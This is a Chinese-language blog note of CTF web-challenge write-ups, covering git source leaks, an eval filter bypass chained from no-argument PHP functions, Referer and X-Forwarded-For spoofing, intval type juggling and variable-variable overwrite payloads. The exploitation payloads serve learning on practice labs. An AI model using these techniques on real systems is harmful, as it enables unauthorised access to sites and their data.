---
title: "inform_collect"
date: 2026-01-21 19:39:43
categories: 默认分类
tags: [笔记]
---









## buuctf 禁止套娃

1.找不到flag，没有思路，dir扫描

git泄露

![image-20251220213424261](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251220213424261.png)



2.githack工具获取源码

![image-20251220213357128](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251220213357128.png)





3.代码分析

```
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
    
                   //preg_replace(正则, NULL, $_GET['exp']) ->把输入中正则部分给删掉
    
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```





### `(?R)?`

| 符号   | 大白话含义                                                   |
| ------ | ------------------------------------------------------------ |
| `(?R)` | 「递归引用」：代表**重复使用整个正则表达式的规则**（比如这道题的 `/[a-z,_]+\((?R)?\)/`） |
| `?`    | 「可选匹配」：代表前面的 `(?R)` 是 “可有可无” 的（有嵌套也匹配，没嵌套也匹配） |



`     /[a-z,_]+\((?R)?\)/`

​      `\(    (?R)?    \)`  这里的\是转义





拆成 ：`函数名 + ( + 可选的嵌套函数 + )`









![屏幕截图 2025-12-20 212227](C:\Users\21709\Pictures\Screenshots\屏幕截图 2025-12-20 212227.png)









因为不能写参数，就用 “无参数 PHP 函数嵌套”，一步步拼出要读的文件：



`var_dump()` 能直接打印**数组**以及所有类型的变量 ，

作用是**把内容打印到页面**，但它本身的返回值是 `NULL`

#### 



1. **拿当前目录（`.`）**：

   用`localeconv()`（无参数，返回含`.`的数组）+`pos()`（无参数，取数组第一个元素`.`）→ `pos(localeconv())`；

2. **扫目录文件**：用`scandir(上面的结果)` → 拿到当前目录的文件数组（含`flag.php`）；



`scandir()` 是这道题里**唯一能 “无参数列出目录文件” 的关键函数**—— 它的本职是 “扫描指定目录，返回该目录下所有文件 / 文件夹的数组”

scandir(.)  :    从 “拿到 `.`（当前目录）” 到 “找到文件” 









1. **定位 flag.php**：用`array_reverse()`（反转数组）+`next()`（取反转后第二个元素）→ 精准拿到`flag.php`；
2. **读文件内容**：用`highlight_file(上面的结果)` → 显示`flag.php`源码，拿到 flag。



```php
// 完整payload拆解（全是无参数函数）
highlight_file(          // 第四步：显示文件内容
  next(                  // 第三步：取反转数组第二个元素（flag.php）
    array_reverse(       // 第三步：反转目录数组
      scandir(           // 第二步：扫描当前目录
        pos(localeconv())// 第一步：拿到当前目录符号.
      )
    )
  )
);
```







localeconv()

1. 它是 PHP 的内置函数，**不用传任何参数**（输入），调用就有返回；
2. 它返回的结果是一个「数组」（可以理解成 “一堆数据的集合，按顺序排好”），而且这个数组里**第一个数据永远是「.」**。



```php
<?php
var_dump(localeconv()); // 打印localeconv()的返回结果
?>
```

```plaintext
array(187) {
  ["decimal_point"]=> string(1) "."  // 第一个核心元素：值是.
  ["thousands_sep"]=> string(1) ","
  ...（后面全是无关的，不用看）
}
```



1.

```php
?exp=var_dump(scandir(pos(localeconv())));
```

```
flag在哪里呢？<br>array(5) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(4) ".git"
  [3]=>
  string(8) "flag.php"
  [4]=>
  string(9) "index.php"
}

```



2.指定到倒数第二个flag

```
?exp=next(array_reverse((scandir(pos(localeconv())))));
```



3.直接用var_dump是获取不到内容的，需要使用highlight_file把flag内容显示到网页



```
?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```













## newstar ctf web multi-headach3

1.访问/robots.txt

题目（”什么叫机器人控制了我的头？“）

提示机器人



2.抓包修改请求头

发现hidden.php，但是被禁止访问

```
User-agent: *
Disallow: /hidden.php
```





该请求头：



1. **User-Agent**：告诉服务器 “我是 Chrome 浏览器，不是扫描工具” → 防爬虫拦截。

    

2. **Referer**：告诉服务器 “我是从网站首页点进来的，不是直接输网址” → 防直接访问。

**直接输网址访问`hidden.php`**：大概率是外人瞎猜的、扫描工具找的，不是正常用户，直接拦

**从首页点链接进来**：只有正常浏览网站的用户才会这么做，是 “自己人”，允许访问。



3. **XFF**：告诉服务器 “我是服务器本机管理员” → 过 IP 限制。

`XFF`头是告诉服务器 “我的真实 IP 是啥”。

开发者会加一个限制：**只有服务器本机（IP 是 127.0.0.1）才能访问`hidden.php`**（相当于只有管理员在服务器跟前操作才有权限）。





总结：

- `Referer`：装成**正常用户**
- `X-Forwarded-For`：装成**服务器管理员**





改成：

```
Referer: http://127.0.0.1:16113/
X-Forwarded-For: 127.0.0.1
```

















## [ACTF2020 新生赛]BackupFile

### 1

知识点：

1.备份文件：.zip  .bak  .swp

2.intval强制转换整数

| 字符串      | 转整数结果 | 原因                           |
| ----------- | ---------- | ------------------------------ |
| "123abc456" | 123        | 遇到 a（非数字）停止，忽略 456 |
| "123.456"   | 123        | 遇到小数点（非数字）停止       |
| "abc123"    | 0          | 开头就是非数字，直接转 0       |
| "123 456"   | 123        | 遇到空格（非数字）停止         |
| "123456"    | 123456     | 纯数字，完整转换               |



3.数字和字符串比较：

`$key`==`$str`

当 PHP 遇到「整数 == 字符串」的比较时

**自动把右边的字符串`$str`转换成整数**，再和左边的整数`$key`比较。







1.dirseach扫描：



[20:40:57] 200 -     0B - http://598f54e8-253a-4cde-9479-7307cd415454.node5.buuoj.cn:81/flag.php
[20:40:58] 200 -   347B - http://598f54e8-253a-4cde-9479-7307cd415454.node5.buuoj.cn:81/index.php.bak





2.打开

```
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);  //强制转换成整型
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}


```





3.直接?key=123









## [BJDCTF2020]Mark loves cat

### 1



知识点：

1.

| 运算符 | 含义                                              | 例子                                                         |
| ------ | ------------------------------------------------- | ------------------------------------------------------------ |
| `===`  | 严格相等：**值 + 类型都必须完全一致**（缺一不可） | `'123' === 123` → false（字符串 vs 整数）；`'flag' === 'flag'` → true（值和类型都是字符串） |
| `==`   | 弱相等：只比较值，自动转换类型                    | `'123' == 123` → true（自动转类型后值相等）                  |
| `!==`  | 严格不等：值或类型任意一个不一样，就成立          | `$x !== 'flag'` → 只要`$x`的值不是`flag`，或类型不是字符串，就满足 |











1.发现git泄露：

很正常的漂亮网页，试了xss，sql注入都没有漏洞



方法一：

所以用dirsearch扫描

[21:57:51] Scanning:
[21:57:53] 200 -     0B - /flag.php
[21:57:59] 403 -   555B - /.git/



方法二：区分是否存在git泄露

在网址后加`/.git`返回 403（Forbidden，禁止访问），说明服务器上**确实存在`.git`目录**，但服务器配置了 “禁止直接访问该目录”；

如果不存在`.git`目录，会返回 404（Not Found，未找到）—— 这是区分 “存在但禁止访问” 和 “完全不存在” 的关键。



2.githack获取源码

index.php

```
<?php

include 'flag.php';									//肯定存在$flag,只是我们看不见

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;										//$a=$flag，所以我们只要把a改为handsome
    												//$handsome=$flag
}

foreach($_GET as $x => $y){							//$x为get得到的参数名，$y为参数名的值

    if($_GET['flag'] === $x && $x !== 'flag'){		//flag参数的值==$x（get得到的参数名）；
    												//$x（get得到的参数名）!= flag 
   														 举例：a=flag&&flag=a
        exit($handsome);							//所以我们只要把a改为handsome，这里输出的$hs就是$flag
    }												//payload：?handsome=flag&flag=handsome
}

//get得到的



if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

知识点：

1. `=>`

在 PHP 的 `foreach` 循环中，它的含义是：

- **`$x` (键/Key)**：这是你传参时的“名字”。
- **`$y` (值/Value)**：这是你传参时“等于号后面的内容”。



2. 核心纠正：$x 到底是“名”还是“值”？

在 `foreach($_GET as $x => $y)` 这一句里：

- **`$x`** 拿的是 **“等号左边的名字”**（参数名）。
- **`$y`** 拿的是 **“等号右边的内容”**（参数值）。

如果你传入 `?handsome=flag`：

- **`$x`** 的值是字符串 `"handsome"`。
- **`$y`** 的值是字符串 `"flag"`。



分析：

方法一：exit($handsome);	

```
要使输出的$handsome为$flag，就联想起前面的变量覆盖，只要使handsome=flag，那么就可以得到了；
所以构造出第一个handsome=flag；
又因为要满足 flag的值 要等于 前面$x的值(handsome)，
所以我们构造出另一个：flag=handsome;此时也满足handsome!='flag'

payload：?handsome=flag&flag=handsome
```



方法二：

```
foreach($_GET as $x => $y){
    $$x = $$y;	

...

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){  //注意这里是 ||
    exit($is);
}
```



payload: ?is=flag&flag=flag

```
$is = $flag
```



方法三：

```
foreach($_GET as $x => $y){
    $$x = $$y;	

...

if(!isset($_GET['flag']) && !isset($_POST['flag'])){		//isset = is set (是否设置了/是否有值)。
    exit($yds);
}
```



```
$yds=$flag
```

payload:?yds=flag



flag.php

```
<?php

$flag = file_get_contents('/flag');   //   /flag是绝对路径


```

